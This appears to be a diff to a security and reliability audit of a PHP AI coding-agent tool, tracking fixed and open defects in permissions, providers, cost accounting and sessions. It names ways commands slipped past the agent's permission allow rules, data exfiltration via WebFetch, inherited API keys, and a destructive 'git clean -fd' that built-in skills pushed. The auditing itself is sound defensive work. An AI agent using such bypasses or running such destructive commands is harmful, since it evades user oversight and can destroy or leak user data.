@@ -96,11 +96,11 @@
 
     Kilo legacy (a `condense` tool with a user-approved preview) and Goose (agent-visible vs user-visible flags) supply the remaining pieces.
 
-11. **The code audit found about 136 new defects** (Part IX). 59 of them, including the one Critical and all 20 High items, are already fixed on master, along with 4 more defects found while fixing them: MCP interoperability with official-SDK servers (nested empty arguments included), fork-shared MCP and LSP connections, silent provider errors (in sub-agents too), invalid UTF-8 (command backends included), the permission bypasses (including `$(…)`, backticks and redirects in allow rules), git MCP option injection, the repo-supplied terminal escapes, unfenced repo skill descriptions, Esc Esc tool placeholders that never healed, raw CR and C1 controls reaching the terminal, a turn kill that left its commands running, streamed tool calls dropped on `stop`, built-in skills that told every project to `git clean -fd`, the full-history markdown re-render on every frame, `error_log()` output painted over the TUI, env-block git calls that honoured the user's git config and took `index.lock`, PostToolUse blocks that did nothing, hook input that defeated grep-style deny hooks, and a hostile `.gitignore` that stalled Glob for minutes. Waves 2 and 3 found 15 more, smaller defects while fixing these. About 92 remain, including:
-    - **Hooks and custom-command shell blocks still run synchronously inside `update()`**, freezing the TUI for up to 60 s and 10 s.
+11. **The code audit found about 136 new defects** (Part IX). 69 of them, including the one Critical and all 20 High items, are already fixed on master, along with 4 more defects found while fixing them: MCP interoperability with official-SDK servers (nested empty arguments included), fork-shared MCP and LSP connections, silent provider errors (in sub-agents too), invalid UTF-8 (command backends included), the permission bypasses (including `$(…)`, backticks and redirects in allow rules), git MCP option injection, the repo-supplied terminal escapes, unfenced repo skill descriptions, Esc Esc tool placeholders that never healed, raw CR and C1 controls reaching the terminal, a turn kill that left its commands running, streamed tool calls dropped on `stop`, built-in skills that told every project to `git clean -fd`, the full-history markdown re-render on every frame, `error_log()` output painted over the TUI, env-block git calls that honoured the user's git config and took `index.lock`, PostToolUse blocks that did nothing, hook input that defeated grep-style deny hooks, a hostile `.gitignore` that stalled Glob for minutes, prompt hooks and custom-command shell blocks that froze the TUI inside `update()`, forks that carried no conversation, the multi-second `/branch` freeze, and Vertex quota errors that were never retried. Waves 2, 3 and 4 found 18 more, smaller defects while fixing these. About 85 remain, including:
     - **UI-only rows are now off the wire, but the compaction summary still reads them.**
-    - **Sub-agent spend never reaches the parent or the spend cap.**
-    - **Permission gaps remain:** WebFetch counts as read-only, Bash inherits provider API keys, and path deny rules miss respellings.
+    - **Sub-agent spend now reaches the parent and the spend cap, but parallel sibling Tasks cannot see each other's spend**, and the user's `modelPrices` setting never reaches Vertex or Bedrock.
+    - **Two TUIs on one session still overwrite each other's transcript** (the writer lock is a deferred decision).
+    - **Permission gaps remain:** WebFetch counts as read-only, Bash inherits provider API keys, and path deny rules still miss respellings outside the main tool loop.
 
     About two thirds are reproduced with scripts. No High item remains; finish the two Medium-High items, both partly fixed, next (IX.3, IX.4).
 
@@ -193,7 +193,7 @@ Severity reflects user impact on the live default path.
 | 27 | Medium | No retry once a stream has produced its first token; no continuation on output-length stops (the 4096 `max_tokens` default on Custom/OpenAI cuts large Writes) | `Runtime::runStreaming` `:1324-1459` | 07 09 10 11 |
 | 28 | Medium | A reply that is only reasoning, or empty, ends the turn silently *(inferred)* | `runTurn()` | 06 08 10 |
 | 29 | Low-Med | Only the final assistant text of a turn is kept, so interim reasoning is lost for the next turn | `EngineBackend.php:985`, `:1019` | 03 |
-| 30 | Low-Med | `/bg` results never come back to chat; `/fork` runs ignore history; daemons are not picked up again after restart | baseline §2.4 | 04 08 10 12 |
+| 30 | Low-Med | `/bg` results never come back to chat; `/fork` runs ignore history (the forked session's stored copy is complete since the fix for audit SES-2, `698a1efff`, but the background daemon does not load it); daemons are not picked up again after restart | baseline §2.4 | 04 08 10 12 |
 | 31 | Low-Med | The OpenAI provider never emits tool calls (always streams; `parseChunk` hard-codes `toolCalls: null`); `anthropic` is OpenAI-shaped with tools off | `OpenAIProvider.php:488-507`; `ProviderFactory.php:663-694` | baseline |
 | 32 | Low-Med | `/model` switches provider, not model, and appears to drop the Task tool and rule toggles *(inferred)* | `Chat.php:14106-14146`; `Bootstrap.php:6748` | baseline |
 | 33 | Low | The session-affinity header is dormant, so multi-replica SGLang routers lose radix locality | `SessionAffinity` trait | 02 12 |
@@ -315,7 +315,7 @@ How the pieces connect:
 | # | Item | Effort | Sources |
 |---|---|---|---|
 | 4.1 | Honour preset `model`/`effort`/`permissionMode` (new `EngineBackend::withModel()`, per-sub-agent `PermissionGate`); per-call `model` arg; `subagentModel` default; **fail loudly** on unsupported preset fields (dsh) | S–M | 9 reports |
-| 4.2 | Argument-scoped **grant** rules for presets, reusing the permission-rule matcher (already argument-scoped, and since `c8fc573a5` fail-closed: the `ShellWords` splitter refuses `$()`, backticks, process substitution and non-inert redirects in allow rules, every segment must match, deny on any segment); harden it against path respellings (Part IX: F-J3); route Task through `refuseCallOutsideGrant()` (dormant) | M | CC Zed Cline Kilo |
+| 4.2 | Argument-scoped **grant** rules for presets, reusing the permission-rule matcher (already argument-scoped, and since `c8fc573a5` fail-closed: the `ShellWords` splitter refuses `$()`, backticks, process substitution and non-inert redirects in allow rules, every segment must match, deny on any segment); hand sub-agent gates the project root so path rules also match respellings there (Part IX: F-J3, fixed on the main tool loop in `3b7d2fd33`); route Task through `refuseCallOutsideGrant()` (dormant) | M | CC Zed Cline Kilo |
 | 4.3 | **Background Task** (`background:true` / preset `background`): returns `{agent_id}` at once ("DO NOT sleep or poll"). Runs via `BackgroundSupervisor` or `AgentWorkerPool`. On settle, a user-role announce row (`[Subagent '<label>' completed] … status from the runtime outcome (ok/error/timeout), stats line: runtime, tokens, cost, resume id`) is appended, and a turn is auto-dispatched if idle or injected via steer if busy. An "Active subagents" block appears in each turn context. Wire `BackgroundSupervisor::reconnect()`. Also fixes `/bg` results never returning | M–L | Claw nano dsh Goose Kilo OC |
 | 4.4 | **Messaging tools** on the dormant `Mailbox`: `SendMessage{to, text, mode: steer\|followup\|note}` (steer a running child, wake an idle one, cold-resume a stored one via `SuspendedDelegations`), child→parent replies, `Subagents{list\|wait\|cancel}`, `InterruptAgent`; delivery at step boundaries through the 1.C seam; untrusted-peer framing | M–L | Claw dsh Kilo Goose nano |
 | 4.5 | **Shared board** for parallel children (Kilo): `BoardRead`/`BoardPost` with INFO/ASK/RESULT/HOLD/VETO, notice appended to the next tool result | M | Kilo |
@@ -808,17 +808,17 @@ Five agents audited sugar-crush's own source for **new** defects, one per area. 
 
 **Totals at audit time: about 136 findings** — 1 Critical, 20 High, about 47 Medium, and the rest Low-Medium, Low or Info.
 
-**Since the audit, 63 findings have been fixed on master** (each appendix ends with a **Fixed since audit** list giving the commit): 59 of the original findings, plus the 4 new items found while fixing them in wave 1. Waves 2 and 3 found 15 more while fixing their items (10 in wave 2, 5 in wave 3); they are open. **About 92 findings remain** — 0 Critical, 0 High, 2 Medium-High (15b-03 and F-E2, both partly fixed), about 31 Medium, and the rest Low-Medium, Low or Info. The tables below count what remains.
+**Since the audit, 73 findings have been fixed on master** (each appendix ends with a **Fixed since audit** list giving the commit): 69 of the original findings, plus the 4 new items found while fixing them in wave 1. Waves 2, 3 and 4 found 18 more while fixing their items (10 in wave 2, 5 in wave 3, 3 in wave 4); they are open. **About 85 findings remain** — 0 Critical, 0 High, 2 Medium-High (15b-03 and F-E2, both partly fixed), about 26 Medium, and the rest Low-Medium, Low or Info. The tables below count what remains.
 
 At audit time, about two thirds were **reproduced with a script**; the rest are verified by reading, and a few are marked *suspected*. Full write-ups are in Appendices Q–U; each finding has code excerpt, failure scenario, fix and a test that would catch it.
 
 | Appendix | Area | Findings | Critical / High |
 |---|---|---|---|
-| **Q** (15a) | Engine, runtime, providers, tool-call parsers, process support | 17 | 0 / 0 |
-| **R** (15b) | Chat state machine, TUI, rendering, commands | 20 | 0 / 0 |
+| **Q** (15a) | Engine, runtime, providers, tool-call parsers, process support | 15 | 0 / 0 |
+| **R** (15b) | Chat state machine, TUI, rendering, commands | 18 | 0 / 0 |
 | **S** (15c) | Tools, permissions, hooks (security) | 18 | 0 / 0 |
 | **T** (15d) | Context assembly, memory, skills, config | 16 | 0 / 0 |
-| **U** (15e) | Agents, workflows, sessions, MCP, git MCP, CLI | 21 | 0 / 0 |
+| **U** (15e) | Agents, workflows, sessions, MCP, git MCP, CLI | 18 | 0 / 0 |
 
 Appendix P adds three session-picker bugs, B1–B3 (Part VIII.4).
 
@@ -828,7 +828,7 @@ Appendix P adds three session-picker bugs, B1–B3 (Part VIII.4).
   - Part II #23 now says so; roadmap item 4.2 now covers only preset grants and path respellings.
   - `docs/PERMISSIONS.md` is now corrected: its stale "Pattern matching is name-only" section was rewritten in `d3d90fece` to describe argument-scoped rules as implemented, and since `c8fc573a5` it describes the fail-closed allow rules.
   - Sub-agent **preset grants** still match by name (`AgentManager::resolveGrantedTools`).
-  - The new matcher's remaining real gap is F-J3 (path rules miss relative and absolute respellings and symlinks). F-P5 (`$(…)`, backticks and redirects slipping past allow rules) was fixed in `c8fc573a5`.
+  - The new matcher's remaining real gap is F-J3, now partly fixed (`3b7d2fd33`): on the main tool loop, path rules also match the root-anchored, resolved and symlinked spellings, but sub-agent gates, Chat's own gate calls and declaration checks get no root and still match lexically. F-P5 (`$(…)`, backticks and redirects slipping past allow rules) was fixed in `c8fc573a5`.
 - **Two documentation statements are stale:** "rule `paths:` scoping not applied" (it is; 15d-19) and "only two keys re-applied per turn" (`maxOutputTokens` is too).
 - **The image-marker / mouse-zone collision from project memory is already fixed** (Appendix P). Agent-supplied text must still be PUA-stripped (15b-17).
 - **Workerman is not used anywhere in the monorepo** (Appendix O §3).
@@ -838,7 +838,7 @@ Appendix P adds three session-picker bugs, B1–B3 (Part VIII.4).
 Several audits found the same root cause in different places. Fixing each theme once fixes them all.
 
 1. **Killing a turn does not kill all of its commands (residue).** Turn teardown and the parallel deadline now kill the whole process tree (`ProcessContainment::killTree()`, `c54372b2a`), so the `setsid`'d `bash` and parallel Task sub-agents die with the turn.
-   - The remaining kill sites still signal one pid: the dormant Chat site, `AgentWorkerPool` and `EngineExecutor` (F-E2, partly fixed).
+   - The remaining kill sites still signal one pid: the dormant Chat site, `AgentWorkerPool`'s cancel path and `EngineExecutor` (F-E2, partly fixed). The pool's new per-agent deadline kill (WF-1 (a), `4fa805970`) already uses `killTree()`.
    - **Fix:** route them through `killTree()` too.
 2. **Terminal-injection and rendering hygiene.** CR, UTF-8 C1 controls, the permission modal's byte wrap and `error_log()` output over the frame are fixed (`Sanitize::untrustedForDisplay()`, the C1 sweep, `Sanitize::visibleControls()`, and `TuiErrorLog`, which sends the TUI's `error_log` to `~/.sugar-crush/logs/sugarcrush.log`). What remains:
    - The tab strip is neither clipped nor sanitized (15b-18).
@@ -855,28 +855,25 @@ Several audits found the same root cause in different places. Fixing each theme 
    - The env block is still re-rendered inside the system message, which hurts cache stability (Part I #2, Part II #2).
 5. **Errors are swallowed and turns "succeed".**
    - Malformed arguments run the tool with `[]` (A11).
-   - Vertex 429/503 are never retried (A19).
 6. **The permission layer has holes in the default and stricter modes.**
    - Accept-edits mode allows `rm`, `mv` and `cp` (F-P4).
    - WebFetch counts as read-only, so it can exfiltrate data unprompted (F-P6).
    - Bash and hooks inherit provider API keys (F-E1).
 7. **Unbounded or stalled work inside `update()`.**
    - A long streaming reply whose headings follow a closing code fence still re-renders whole on every frame, because candy-shine's `SectionScanner` finds no boundary there (15b-31, the residual of the fixed 15b-10).
-   - UserPromptSubmit and SessionStart hooks run synchronously, freezing the UI for up to 60 s (15b-04).
-   - Custom-command `` !`…` `` runs inside `update()` (15b-20).
-   - `/branch` does one INSERT per message: a 4.3 s freeze at 800 messages (15b-21).
+   - Transcript persistence still runs synchronously inside `update()`, though each save is now one transaction and `/branch` no longer re-interns the history (a residual, noted in Appendix R's **Fixed since audit** list).
    - `AgentManager` never forgets sub-agents (AG-3).
 8. **Sessions and persistence integrity.**
-    - `forkSession` copies dead tables, so the fork is empty and `--resume name` opens the parent. This is a root cause of "/fork ignores history" (SES-2).
-    - No writer lock: two TUIs on one session clobber each other (SES-3).
+    - No writer lock: two TUIs on one session still overwrite each other's transcript. The checkpoint-index and blob-intern races are closed (SES-3, partly fixed; the lock and second-TUI behaviour are a deferred decision).
+    - A `/fork` now copies the whole conversation, but the background daemon does not load it (Part II #30).
     - UI-only command output and notices are kept off the wire by `Message::$uiOnly`, but the compaction summary still reads them, and notices still interleave between a prompt and its answer (15b-03, partly fixed; relates to Part II #2 and the DCP `uiOnly` proposal).
 9. **MCP: remaining interoperability and trust gaps.**
     - `claude-mcp` gives up after about 1 s (MCP-3).
     - OAuth discovery and storage bugs (MCP-6/7/8).
     - Trust is bound to the project path, not to `.mcp.json`'s content (MCP-5).
 10. **Cost accounting holes.**
-    - Task sub-agent spend never reaches the parent or the cap (B4).
-    - Vertex is priced at $0 and Bedrock invents $0.01 (A15, A20).
+    - Task sub-agent spend now reaches the parent, the session total and the cap, but parallel sibling Tasks cannot see each other's spend (overshoot up to one step), a crashed tool child reports none, and Chat's calibration fallback is inflated by sub-agent tokens (B4, partly fixed).
+    - Vertex and Bedrock now have list-price tables and flag unknown models unpriced, but `ProviderFactory` never hands them the user's `modelPrices`, cache tokens are unpriced there, and the default Bedrock config still sends a bare model id (A15, A20, both partly fixed).
     - The OpenAI context window has no config override (A13, partly fixed: the 8k sizes are corrected, and cached tokens are now billed at the cached rate).
     - A trusted project can choose title and summary models billed to the user's key (15d-24).
     - Together these mean the spend cap is unreliable on every provider except priced ones.
@@ -905,11 +902,9 @@ The Critical item and all 20 High items are fixed on master, as is the latent Hi
   - the rest of 15b-03 (the compaction input and notice order; the `uiOnly` flag itself has landed);
   - stable unique ids (also needed by A8, the markup duplication).
 - **With the sessions phase (VIII.4 A):**
-  - SES-2 (fork copies dead tables);
-  - SES-3 (writer lease; the server design's `session_leases` table covers it);
-  - session picker bugs B1–B3;
-  - 15b-21.
-- **With rendering work:** 15b-30 and 15b-31 (candy-shine streaming fixes, so sugar-crush can drop its workarounds; 15b-10's memoization has landed), 15b-04 and 15b-20 (move hooks and shell into `Cmd`).
+  - SES-3 (b) (writer lease; the server design's `session_leases` table covers it);
+  - session picker bugs B1–B3.
+- **With rendering work:** 15b-30 and 15b-31 (candy-shine streaming fixes, so sugar-crush can drop its workarounds; 15b-10's memoization has landed).
 
 
 ---
@@ -19649,13 +19644,9 @@ Confidence key: **Verified-by-repro** (a repro script showed the behaviour), **V
 - **Failure scenario:** a paid Claude model on Vertex reports `costUsd = 0.0`. The usage carrier has `unpricedModel = null`, so the UI shows a confident `$0.0000` rather than "unknown", which breaks the "unpriced ≠ zero" contract documented on `Usage`. `EngineBackend`'s mid-turn spend cap (`:922-940`) and Chat's pre-flight cap never trip. Bedrock models outside the table get an invented price.
 - **Fix:** return `?float` with `null` for unknown models (the interface already allows `?float`, `ProviderInterface.php:49`), propagate `unpricedModel` the way `OpenAIProvider::parseUsage` does, and add a `modelPrices` config like OpenAI's.
 - **Test:** `VertexProvider::parseAnthropicUsage([...], 'claude-x')` should give either a non-zero cost or `unpricedModel === 'claude-x'`.
-
-#### A16 — Bedrock does not merge consecutive same-role turns and sends blank text blocks
-- **Severity:** Low (non-default provider) · **Confidence:** Verified-by-repro for the wire shape (`repro_bedrock_roles.php`). Server-side rejection was not run live (no AWS credentials). It rests on the Converse API's documented validation rules ("must alternate between user and assistant roles"; "text field … is blank").
-- **Where:** `src/Providers/BedrockProvider.php:316-332`. Compare `VertexProvider::formatAnthropicMessages` at `:708-737`, which does merge.
-- **Failure scenario:** **Repro:** `[User, User, Assistant(''), User]` is sent unchanged as `user, user, assistant{text:""}, user`. Nothing merges the two user turns, and the blank text block goes out as-is. Two everyday paths produce `user, user`. One is a turn that failed: Bedrock *throws* on errors, so the user row gets no assistant reply. The other is `HistorySanitizer` (`HistorySanitizer.php:115-118`) dropping an empty assistant reply. Because the whole history is replayed, every later request in that Bedrock session sends the same invalid shape.
-- **Fix:** merge adjacent same-role messages into one content array, and skip empty text blocks, as Vertex does.
-- **Test:** a history of `[User a, Assistant '', User b]` should produce strictly alternating roles with no empty `text`.
+- **Partly fixed on master in `587a30d68` (Vertex) and `c9772c065` (Bedrock).** Both providers carry built-in list-price tables for Claude (and, on Vertex, Gemini), looked up on cleaned model ids. An unknown model costs $0 and is flagged unpriced, so the UI shows it as unpriced rather than a confident `$0.0000`, and Bedrock's invented $0.01/1k is gone. A new `modelPrices` constructor and `create()` parameter lets a caller supply its own prices. **Remaining:**
+  - `ProviderFactory::createVertex()` and `createBedrock()` (`src/Providers/ProviderFactory.php:991`, `:980`) do not pass `self::userTierModelPrices()` as `modelPrices:`, as `createOpenAI()` does. The user's `modelPrices` setting therefore never reaches these two providers, although Chat's unpriced notice tells the user to set it. The `modelPrices` row in `docs/SETTINGS.md:162` still names only `createOpenAI()` and needs the same update.
+  - Cache read and cache write tokens are still unpriced on Vertex and Bedrock.
 
 #### A18 — New evidence for known #27/#28: the default provider sends `max_tokens: 4096` with DeepSeek-V4 `reasoning_effort: max`
 - **Severity:** (sharpens known High/Medium items) · **Confidence:** Suspected — verification pending. Measure `usage.reasoning_tokens` and `finish_reason` on the live SGLang server for a few agentic prompts at effort `max`.
@@ -19663,26 +19654,15 @@ Confidence key: **Verified-by-repro** (a repro script showed the behaviour), **V
 - **Why this is materially new:** Part II #27 places the 4096 default on Custom/OpenAI. It is also the default path. In SGLang, generated reasoning tokens count against `max_tokens`, so a max-effort think can use the whole budget. That gives `finish_reason: length` with empty content, which is exactly known #28's "thinking-only reply ends turn", now with a likely root cause on the default configuration.
 - **Fix:** set a model-aware default (for example 32k+ for V4 at effort max), or omit `max_tokens` so the server's default applies.
 
-#### A19 — Vertex transport errors are never classified as transient: 429 `RESOURCE_EXHAUSTED` and 503 `UNAVAILABLE` get no retry
-- **Severity:** Medium · **Confidence:** Verified-by-repro (`repro_vertex_transient.php`)
-- **Where:** `src/Providers/TransientFailure.php:197-237` and `:405-422`. The callers are `VertexProvider.php:318-334`, `:404-415` and `:1384-1391`, each of which sets `errorTransient: TransientFailure::isTransient($e)`.
-- **Code:**
-  ```php
-  if ($error instanceof RequestException) { ... }
-  if (method_exists($error, 'getStatusCode')) { ... }   // Google\ApiCore\ApiException has none
-  return null;
-  // ...and no instanceof arm for ApiException, so the chain walk ends with `false`
-  ```
-- **Failure scenario:** the vendored gax REST transport (`gax/src/Transport/RestTransport.php:176-177`) converts every Guzzle `RequestException` into `Google\ApiCore\ApiException::createFromRequestException()`. That exception carries the **gRPC** code (`getCode()` gives 8, 14 or 13) and `getStatus()` gives `RESOURCE_EXHAUSTED` and so on. It has **no `previous`** and no `getStatusCode()`. **Repro:** HTTP 429, 503, 500 and 401, and a gRPC-style `UNAVAILABLE(14)`, all return `isTransient=false`. Vertex quota 429s are routine on shared projects, and so are model-overloaded 503s. Every one is reported as a permanent `isError`, with no retry, so the turn fails on the first quota error. (Before the A1 fix the user then saw an empty reply; the error is now shown, but still not retried.) `VertexProvider.php:1551-1555` documents that `ApiException` "is caught by complete() and classified by TransientFailure::isTransient()". That claim is false.
-- **Fix:** add an arm `if ($link instanceof \Google\ApiCore\ApiException) return in_array($link->getStatus(), ['RESOURCE_EXHAUSTED','UNAVAILABLE','DEADLINE_EXCEEDED','INTERNAL','ABORTED'], true);`, guarded by `class_exists`. Also map `ApiException` without a status to network errors.
-- **Test:** the repro as a data provider in `TransientFailureTest`. Add a Vertex `complete()` test with a predictor that throws `ApiException(…, 8, 'RESOURCE_EXHAUSTED')`, asserting `errorTransient === true`.
-
 #### A20 — Bedrock's window and price tables match only bare model ids; every real versioned or inference-profile id gets an 8,192-token window and an invented $0.01/1k
 - **Severity:** Medium (non-default provider) · **Confidence:** Verified-by-reading for the matching. The model-id format and the on-demand rule come from AWS documentation and were not run live.
 - **Where:** `src/Providers/BedrockProvider.php:146-169` (exact-string `match` in `contextWindow()` and `costPer1kTokens()`), and `:46` (`DEFAULT_MODEL = 'anthropic.claude-sonnet-4-6'`).
 - **Failure scenario:** Bedrock model ids carry a version suffix (`…-v1:0`). Claude 4.x on-demand calls must also use an inference-profile id with a region prefix (`us.` / `eu.` / `global.` + `anthropic.claude-…`) or an ARN. None of these equal a table key, so `contextWindow()` returns `default => 8_192`. Chat's context tiers (reminder, auto-compaction, blocking refusal) then fire against 8k on a 200k model: auto-compaction runs after a few messages, on every turn. This also contradicts the `ProviderInterface` contract that unknown means `0`. `costPer1kTokens()` invents `$0.01/1k` both ways, which the interface docblock (`ProviderInterface.php:34-45`) explicitly calls the pre-billing-fix bug. The bare-id `DEFAULT_MODEL` is also probably refused for on-demand throughput on Claude 4.x (suspected; needs a live call).
 - **Fix:** normalise the id before lookup: strip a region-profile prefix and an ARN path, and match on `str_starts_with` of the family key. Return `0` and `null` for unknown models, and set `unpricedModel`. Ship an inference-profile `DEFAULT_MODEL`.
 - **Test:** `new BedrockProvider($client, model: 'us.anthropic.claude-sonnet-4-6-v1:0')` should report a window of at least 200k, and `costPer1kTokens('us.meta.x', 'input')` should be `null`.
+- **Partly fixed on master in `c9772c065`.** Model ids are normalised before both lookups: an ARN path, a `us.`/`eu.`/`global.` inference-profile prefix and version or date tails are stripped. An unknown model gets window `0` (so `ContextWindow::resolve()` applies its named fallback) and is flagged unpriced. The fabricated `claude-haiku-4-7` row was dropped, and `DEFAULT_MODEL` is now the inference-profile id `us.anthropic.claude-sonnet-4-6`. **Remaining:**
+  - the default Bedrock config in `src/Providers/ProviderFactory.php:436` still sends the bare id `anthropic.claude-sonnet-4-6`, which is probably refused for on-demand throughput on Claude 4.x;
+  - the user's `modelPrices` setting does not reach Bedrock (the `ProviderFactory` plumbing gap in A15).
 
 #### A21 — Gemini 2.5 on Vertex thinks by default: thinking tokens are left out of Usage and share the 4,096 `maxOutputTokens` default
 - **Severity:** Medium (non-default provider) · **Confidence:** Suspected. Verification pending: one live `streamGenerateContent` against `gemini-2.5-pro`/`-flash` with a long agentic prompt, reading `usageMetadata.thoughtsTokenCount` and `finishReason`.
@@ -19690,6 +19670,7 @@ Confidence key: **Verified-by-repro** (a repro script showed the behaviour), **V
 - **Failure scenario:** Gemini 2.5 Pro and Flash think by default when `thinkingConfig` is absent. Omitting it hides the thought *parts* (`includeThoughts` defaults to false) but not the thinking itself. Thought tokens are billed as output, and per Google's documentation they count against `maxOutputTokens`. Two consequences follow. (1) `Usage.totalTokens` and `outputTokens` under-count every Gemini turn; cost is already $0 because of A15. (2) A hard prompt can spend most of the 4,096 budget thinking, ending with `finishReason: MAX_TOKENS` and little or no text. That is the same mechanism as A18 and known #28, on a different provider.
 - **Fix:** fold `thoughtsTokenCount` into a reasoning or output bucket, add a `thinkingConfig.thinkingBudget` setting, and raise the default `maxOutputTokens` for 2.5 models (for example 32k), or omit it.
 - **Test:** `parseUsageMetadata(['promptTokenCount'=>10,'candidatesTokenCount'=>5,'thoughtsTokenCount'=>900], 'gemini-2.5-pro')` should account for the 900 tokens.
+- **Partly fixed on master in `ade4d444a`** (part (a)). `thoughtsTokenCount` is now counted as output (reasoning) tokens and priced, on the streaming path too. **Remaining:** part (b), the default 4,096 `maxOutputTokens` (`VertexProvider.php:127`, `DEFAULT_MAX_TOKENS`) and a `thinkingBudget` setting, is a deferred decision (wave plan §3 #12); it needs a live check against Gemini 2.5.
 
 #### A23 — Replayed tool-call arguments send a nested empty map as `[]`
 - **Severity:** Low-Medium · **Confidence:** Verified-by-reading (found while fixing A7)
@@ -19697,6 +19678,13 @@ Confidence key: **Verified-by-repro** (a repro script showed the behaviour), **V
 - **Failure scenario:** A7's fix (`d2911641e`) forces an object only at the top level, so lists now replay correctly. Below the top level, PHP cannot tell an empty map from an empty list once the JSON was decoded as an associative array. The model calls a tool with `{"opts":{}}` (an options bag, a filter, a headers map), and every later step and turn replays that call as `{"opts":[]}`. The model sees its own earlier call in a shape that contradicts the tool's schema, and tends to copy it. This is the same class as 15e MCP-9 (nested empty maps on the MCP wire), which was fixed there by walking the arguments against the tool's `inputSchema`.
 - **Fix:** keep the provider's raw `function.arguments` JSON string on the `ToolCall` when it arrives, and replay that string verbatim (re-encoding only calls that have no raw string, such as recovered textual calls). Alternatively, decode with objects (`json_decode` without `assoc`) end to end, so both shapes round-trip.
 - **Test:** replay an assistant tool call whose arguments arrived as `{"opts":{},"paths":[]}`, and assert the outgoing `arguments` string is byte-equal to that input.
+
+#### A24 — A test comment still calls Vertex's rate table "a placeholder 0.0"
+- **Severity:** Info (test comment) · **Confidence:** Verified-by-reading (found while fixing A15 in wave 4)
+- **Where:** `tests/Integration/UsageWiringTest.php:1012-1014`: "cost stays 0.0 either way because Vertex's rate table is a placeholder 0.0".
+- **Detail:** since A15's fix (`587a30d68`), Vertex has a real list-price table, and an unknown model is flagged unpriced rather than priced at a placeholder. The test still passes, because its fixture reports no tokens, so the cost is 0.0 for that reason. Only the comment's explanation is wrong, and it tells the next reader that Vertex is still unpriced.
+- **Fix:** reword the comment to say the cost is 0.0 because the fixture reports zero tokens.
+- **Test:** none needed beyond review.
 
 ---
 
@@ -19714,19 +19702,16 @@ Confidence key: **Verified-by-repro** (a repro script showed the behaviour), **V
 - **Failure scenario:** a turn fans out 5 parallel Tasks, each running up to 50 steps (`DEFAULT_MAX_TURNS`). None of those tokens or dollars reach `Message::usage`, so `/cost`, the token tracker and the context calibration all under-report. The sub-agent's own cap check starts from `sessionSpendAtStartUsd` with an empty `$stepUsages`, so it ignores the parent's spend so far this turn and every sibling's. The parent's boundary check ignores all sub-agent spend. A `/budget` cap can therefore be exceeded by sub-agent spend that is never counted.
 - **Fix:** add `?Usage $usage` to `ToolResult`, and carry it through `encodeResult`/`decodeResult` (`Runtime.php:2524-2557`) and `ToolResultMessage`. Fold tool-reported usage into `$stepUsages` in `runTurn()`, and pass a shared running total into the sub-agent's spend cap.
 - **Test:** a Task over a stub provider that reports a cost of $1 per step should make the parent's `Message::usage->costUsd` include the sub-agent's dollars, and a cap of $0.5 should stop the sub-agent.
-
-#### B5 — `withPermissionApprover()` and `withMemoryStore()` silently drop the spend cap
-- **Severity:** Low (latent) · **Confidence:** Verified-by-reading
-- **Where:** `src/Backend/EngineBackend.php:540-543` and `:573-576`. Both call `new self(...)` with 14 arguments, so `$spendCapUsd` and `$sessionSpendAtStartUsd` fall back to null and 0.0.
-- **Failure scenario:** today `Chat.php:9269` applies `withSpendCap()` last, so nothing breaks yet. Any embedder, or future code, that calls either wither after `withSpendCap()` loses the cap without any signal. This is the bug class the `mutate()` convention exists to prevent.
-- **Fix:** route every wither through one private `mutate()` with named arguments.
-- **Test:** `withSpendCap(1.0)->withMemoryStore(null)->withPermissionApprover(fn() => true)` should preserve the cap (assert through reflection, or behaviourally with a costing stub).
+- **Partly fixed on master in `badb3353e`.** Task sub-agent spend now reaches the parent's `Message::usage`, the session total, `/cost` and the mid-turn spend cap. `ToolResult` and `ToolResultMessage` carry a `?Usage` off the frame wire; Runtime folds each settled result's tool usage into the step; the Task engine gets a `turnSpendProbe`, so the sub-agent's cap check sees the parent's spend so far this turn; and `TaskTool` sets usage on the report, on refusals and on the pool path. The same commit fixed a `TypeError` in TaskTool's listener on `SpendCapBreached`, and `EngineExecutor`'s failure paths now carry spend. **Remaining:**
+  - parallel Tasks in one step cannot see each other's spend, so the cap can be overshot by up to one step's worth of sibling spend;
+  - a forked tool child that crashes reports no usage;
+  - Chat's E17 calibration falls back to `totalTokens` when a provider reports no prompt-token buckets (`src/Chat.php:16240`), and that total now includes sub-agent tokens, which inflates the calibration. The fix belongs in `Chat.php`.
 
 ---
 
 ### C. Runtime
 
-These are covered above: B4 (no usage channel on tool results). B2 (deadline kill orphans) was fixed in `c54372b2a`.
+These are covered above: B4 (no usage channel on tool results; partly fixed in `badb3353e`). B2 (deadline kill orphans) was fixed in `c54372b2a`.
 
 #### C3 — Project instructions (`CLAUDE.md`/`AGENTS.md` + every `@import`) have no byte budget, while rules have 64 KiB
 - **Severity:** Low · **Confidence:** Verified-by-reading
@@ -19753,20 +19738,18 @@ These are covered above: B4 (no usage channel on tool results). B2 (deadline kil
 | A10 | Medium | reading | `CustomProvider` sends a literal `extra_body` key. Partly fixed (`4f8869c63`: no literal key; opt-in constructor `array $extraBody`); remaining: no config key feeds `extraBody` | CustomProvider.php:172, 240 |
 | A12 | Medium | repro+reading | claude-code streaming cannot work (no `--verbose`, wrong framing, argv > 128 KiB) | ClaudeCodeProvider.php:99-310 |
 | A13 | Medium | reading | OpenAI window is 8k for gpt-4o-mini/4.1. Partly fixed (`58d25cb3b`: ids sized, unknown → 0); remaining: no context-window config override | OpenAIProvider.php:103-112 |
-| A15 | Medium | reading | Vertex priced at $0 (spend cap inert); Bedrock invents $0.01 | VertexProvider.php:278; BedrockProvider.php:158 |
-| **A19** | Medium | repro | Vertex `ApiException` (429/503/500) never classified transient: no retry, then empty reply | TransientFailure.php:197-237, 405-422; VertexProvider.php:318, 404, 1384 |
-| **A20** | Medium | reading | Bedrock tables match only bare ids: real versioned/profile ids get an 8k window and an invented $0.01/1k | BedrockProvider.php:46, 146-169 |
-| **A21** | Medium | suspected | Gemini 2.5 default thinking: thought tokens missing from Usage and sharing the 4096 `maxOutputTokens` | VertexProvider.php:1459, 1770-1793 |
-| B4 | Medium (High paid) | reading | Task sub-agent spend never reaches the parent, session total or cap | TaskTool.php:604-608; ToolResult.php; EngineBackend.php:890-941 |
+| A15 | Medium | reading | Vertex priced at $0 (spend cap inert); Bedrock invents $0.01. Partly fixed (`587a30d68`, `c9772c065`: list-price tables, unknown → $0 flagged unpriced, `modelPrices` ctor param); remaining: `ProviderFactory` does not pass the user's `modelPrices` to Vertex/Bedrock, cache tokens unpriced | VertexProvider.php; BedrockProvider.php; ProviderFactory.php:980, 991 |
